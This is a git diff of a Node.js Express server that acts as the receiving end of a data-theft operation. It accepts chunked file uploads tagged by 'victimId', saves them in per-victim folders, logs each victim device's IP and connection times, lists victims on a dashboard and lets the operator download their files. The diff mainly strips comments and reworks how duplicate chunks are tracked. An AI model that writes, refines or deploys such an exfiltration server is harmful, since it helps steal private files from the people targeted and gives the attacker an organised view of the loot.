@@ -5,9 +5,8 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
+const PORT = process.env.PORT || 8080;
 
-// Enable CORS with specific options
 const corsOptions = {
   origin: ['https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
   methods: ['GET', 'POST', 'OPTIONS'],
@@ -16,13 +15,11 @@ const corsOptions = {
 };
 app.use(cors(corsOptions));
 
-// Log all incoming requests for debugging
 app.use((req, res, next) => {
   console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
   next();
 });
 
-// Handle OPTIONS requests for /upload
 app.options('/upload', (req, res) => {
   res.header('Access-Control-Allow-Origin', corsOptions.origin);
   res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
@@ -31,17 +28,14 @@ app.options('/upload', (req, res) => {
   res.status(204).end();
 });
 
-// Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
 app.get('/dashboard/', (req, res) => {
   res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
 });
 
-// Middleware to handle raw binary data for file uploads
 app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
-// Base directory for storing files
 const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
 if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
@@ -50,28 +44,15 @@ if (!fs.existsSync(OUTPUT_BASE_DIR)) {
 const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
-const victimFiles = {};
 const connectedDevices = {};
 
-// Track chunks to avoid duplicates
-const chunkTracker = new Set();
-
-// Function to check if all files are received
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
     console.log(`✅ All files received for victim ${victimId}`);
-    const files = filesInFolder.map((filename) => {
-      const filePath = path.join(victimFolder, filename);
-      const stats = fs.statSync(filePath);
-      return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
-    });
-
-    victimFiles[victimId] = files;
   }
 }
 
-// Route to handle file uploads
 app.post('/upload', (req, res) => {
   try {
     const filename = decodeURIComponent(req.headers['filename']);
@@ -84,38 +65,25 @@ app.post('/upload', (req, res) => {
       return res.status(400).json({ error: 'Missing or invalid headers' });
     }
 
-    const chunkId = `${victimId}-${filename}-${chunkIndex}`;
-
-    // Skip duplicate chunks
-    if (chunkTracker.has(chunkId)) {
-      console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
-      return res.status(200).json({ message: 'Duplicate chunk skipped' });
-    }
-
-    chunkTracker.add(chunkId);
-
-    if (!connectedDevices[victimId]) {
-      connectedDevices[victimId] = {
-        ip: ip,
-        connectionTime: new Date(),
-        lastConnectionTime: new Date(),
-        filesTransferred: 0,
-        fileList: [],
-      };
-    } else {
-      connectedDevices[victimId].lastConnectionTime = new Date();
-    }
-
     if (!victimFolders[victimId]) {
       const timestamp = new Date().toISOString().replace(/:/g, '-');
       victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
-      victimFileCounts[victimId] = 0;
       victimTotalFiles[victimId] = totalChunks;
+      victimFileCounts[victimId] = {};
     }
 
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
+
+    if (!victimFileCounts[victimId][filename]) {
+      victimFileCounts[victimId][filename] = new Set();
+    }
+
+    if (victimFileCounts[victimId][filename].has(chunkIndex)) {
+      console.log(`⏭️ Skipping duplicate chunk: ${chunkIndex} of ${totalChunks} for ${filename}`);
+      return res.status(200).json({ message: 'Duplicate chunk skipped' });
+    }
 
     fs.appendFile(filePath, req.body, (err) => {
       if (err) {
@@ -123,17 +91,10 @@ app.post('/upload', (req, res) => {
         return res.status(500).json({ error: 'Error saving file' });
       }
 
-      console.log(`✅ Chunk ${chunkIndex} of ${totalChunks} received for file: ${filename}`);
-      victimFileCounts[victimId] += 1;
-      connectedDevices[victimId].filesTransferred += 1;
+      console.log(`✅ Chunk ${chunkIndex} of ${totalChunks} received for ${filename}`);
+      victimFileCounts[victimId][filename].add(chunkIndex);
 
-      // Add the file to the list only if it's not already there
-      if (!connectedDevices[victimId].fileList.includes(filename)) {
-        connectedDevices[victimId].fileList.push(filename);
-        connectedDevices[victimId].filesTransferred += 1;
-      }
-
-      if (chunkIndex === totalChunks) {
+      if (victimFileCounts[victimId][filename].size === totalChunks) {
         console.log(`✅ File upload complete: ${filename}`);
         checkAndSendEmail(victimId, victimFolder);
       }
@@ -146,27 +107,21 @@ app.post('/upload', (req, res) => {
   }
 });
 
-// Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
   res.json(connectedDevices);
 });
 
-// Route to download files
 app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
-
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
-
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
-
     if (!fs.existsSync(filePath)) {
       return res.status(404).json({ error: 'File not found' });
     }
-
     res.download(filePath, filename, (err) => {
       if (err) {
         console.error(`❌ Error sending file:`, err);
@@ -179,7 +134,6 @@ app.get('/download/:victimId/:filename', (req, res) => {
   }
 });
 
-// Start the server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
 });
